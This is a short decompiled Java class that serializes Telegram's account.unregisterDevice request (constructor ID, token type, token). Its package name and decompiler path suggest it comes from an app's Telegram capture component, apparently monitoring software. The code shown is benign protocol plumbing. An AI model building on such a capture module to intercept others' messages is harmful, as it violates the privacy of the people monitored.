package com.vvt.capture.telegram.internal;

public class TLRPC$TL_account_unregisterDevice
  extends TLObject
{
  public static int constructor = 1707432768;
  public String token;
  public int token_type;
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Bool.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    i = this.token_type;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.token;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_account_unregisterDevice.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */